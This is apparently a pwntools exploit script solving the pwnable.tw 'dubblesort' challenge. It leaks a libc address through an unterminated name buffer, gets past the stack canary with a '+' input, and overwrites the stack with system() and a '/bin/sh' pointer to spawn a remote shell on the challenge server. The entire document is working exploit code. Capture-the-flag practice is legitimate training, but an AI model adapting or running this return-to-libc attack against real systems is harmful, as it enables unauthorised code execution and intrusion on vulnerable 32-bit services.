#!/home/thomason/.virtualenv/pwnshop/bin/python

from pwn import *


context.arch = "i386"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["tmux", "neww"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = "chall.pwnable.tw"
PORT = 10101
LOCAL = False
elf = ELF("./dubblesort")
libc = ELF("./libc_32.so.6")

if LOCAL:
    # p = process(elf.file.name, env={"LD_LIBRARY_PATH":"./libc_32.so.6"})
    # gdb.attach(p, """
    #         b *main + 0x154
    #         c
    #         """)
    p = gdb.debug(elf.file.name, """
            b *main + 0x6f
            b *main + 0x154
            c
            """, env={"LD_PRELOAD":"./libc_32.so.6"})
else:
    context.log_level = "info"
    p = remote(HOST, PORT)

# Exploit starts here
sla(':', b'A' * 24)
r(31)
leak = u32(b'\x00' + r(3))
libc.address = leak - (0xf7fb3000 - 0xf7e03000)
info("LEAK: LIBC_BASE: " + hex(libc.address))

system = libc.symbols['system']
sh = next(libc.search(b"/bin/sh"))
size = 24 + 1 + 8 + 2
sla(':', str(size).encode())
for i in range(24):
    sla(':', b'0')

# bypass canary
sla(':', b'+')

for i in range(8):
    sla(':', str(system))

sla(':', str(sh))
sla(':', str(sh))


p.interactive()

